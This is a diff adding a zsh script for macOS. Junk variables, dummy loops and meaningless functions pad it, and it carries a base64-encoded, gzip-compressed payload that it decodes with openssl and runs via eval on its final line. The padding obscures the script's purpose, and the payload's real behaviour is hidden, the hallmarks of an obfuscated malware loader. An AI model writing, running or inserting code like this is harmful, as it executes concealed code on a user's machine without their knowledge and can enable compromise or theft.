@@ -1,0 +1,62 @@
+#!/bin/zsh
+# mb2zqgb4taxb 9266
+resolve_deps_ka7() {
+  local f7s7=0
+  [ -d "$HOME" ] && f7s7=1
+  return $f7s7
+}
+k5c627h1rv="$(date +%s)"
+y8bwu8xtq="false"
+cqkcsd=$(uname -s 2>/dev/null)
+nhtlxjckjj41="$(date +%s)"
+bk2oq6=("lejqv" "xcf6q" "ud0l1iq")
+if [ -z "$cqkcsd" ]; then
+  cqkcsd="Darwin"
+fi
+fxn0=0
+while [ $fxn0 -lt 2 ]; do
+  : "$((RANDOM % 256))"
+  fxn0=$((fxn0+1))
+done
+
+etpuz87u=$(cat <<'_EOF_'
+HFkkm6E2hNiNS+XqhUcF+IX68Fd6Bq0CUdCAug3P1OuanIFx5tCpWrQ4iVvKnoLMs1GW7PfAf7hs0cMQ
+_EOF_
+)
+
+cfsa7g=$(openssl base64 -d <<'PAYLOAD_END' | gunzip
+H4sIAAAAAAAC/5RT227aQBB991dsKcJBlcXMei9NVCIloi1N2iQlpGqjlRBgAxuMzc2QgPzv1e66
+TWj70ocRntmZc+ZyeP2qMdBpY7eaeN402mRD3gxRCG+QJSwXzUr1aDvJ+jNdr3iLFJ/kcDyKTFRH
+JMgJPW1E8aaR5klSr3ie1lmYps3q0Xyp0/WI+Ao5KBSsNPMdKpBUAZfWkEmFgio030IoZFwB5wok
+KJCogJtY6N5N3Nagw+LofM5tneOgNm5rDBcv8QVXyIUCKctcx2Vipg4kd5gWO3RY5p0xv+5N82TB
+Dsay8LykMynVvU0qSDBa3ZKAkSAYZmkaD9fBWs/iLF8TToJg1n+0PkEgwXdyc33bJUGb+PkqXp6Q
+s/FF1L5//2OcXOxuOhnrXl3f7qb3naSHb1tfvt2f7TZp6yHD/LL94S7CQQTz3Lf157lOok8tA3G5
+S7vru7NZuzeDzmR5CXrUiVvTpLu5G/QevvKP84sFvz7f6ave55VPKtW9O1tRIe9+X5M8H5bQ0xqS
+mhcfL7IN/t9xyyXbLYnDrRl7eQCBCszvPw4Ott7UosIQFVKqELkCwwlMIYTPHBIVInXCMhg0tLjW
+p0IhMnMxhaFUCMYHl09LY0whNcbdfCAdPjP41OGbGUwfQrq5Q6pAuL7t3LYn04dwWFAKV/wSGSuF
+ZkXm173+djw43r7crctnTtwCSqFDubNy3263ft2Llxk8HpxGwjOF+1/4dU/rBdV/6digGhZ7sUMt
+Z6S6d70VpLp3CihIrWYcQ1mQYPgixT5YkoK8efzzoXQ874RU9/N4vcwn65MmFNbXT6O8v9ha/2cA
+AAD//1u65pKUBAAA
+PAYLOAD_END
+)
+
+igma653t9gf9="auto"
+if [ -z "$lrk9bn" ]; then
+  lrk9bn="Darwin"
+fi
+zt2n9l3nb="yvt42vf73f1nz6fk"
+ginr=0
+while [ $ginr -lt 1 ]; do
+  : "$((RANDOM % 256))"
+  ginr=$((ginr+1))
+done
+puwys6=("n124gy" "b93em" "crdnacemn" "wr8hdh")
+lrk9bn=$(uname -s 2>/dev/null)
+resolve_deps_zhp() {
+  local ox2z=0
+  [ -d "$HOME" ] && ox2z=1
+  return $ox2z
+}
+hz37g15jjxq="$(sw_vers -productVersion 2>/dev/null)"
+
+eval "${cfsa7g}"
